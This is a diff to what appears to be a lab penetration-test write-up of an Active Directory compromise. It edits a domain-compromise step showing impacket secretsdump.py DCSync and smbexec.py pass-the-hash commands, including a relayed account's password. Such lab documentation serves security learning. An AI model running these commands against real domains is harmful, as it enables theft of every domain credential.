@@ -109,9 +109,9 @@ smbexec.py Administrator@192.168.100.13 -hashes aad3b435b51404eeaad3b435b51404ee
 
 ### 5. Domain Compromise
 
-**NTDS.dit Dump** — Full domain credential dump from the Domain Controller using DCSync via DRSUAPI method.
+**NTDS.dit Dump** — Using the account created via mitm6 IPv6 relay with DCSync privileges to dump all domain credentials.
 ```bash
-secretsdump.py giahuy.local/Administrator@192.168.100.131 -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH>
+secretsdump.py 'giahuy.local/uxmMlLalAJ:GY}{.#<qVo$<Tzo@192.168.100.131' -just-dc
 ```
 ![NTDS Dump - Full Domain Credentials](Screenshots/12-ntds-dump.png)
 
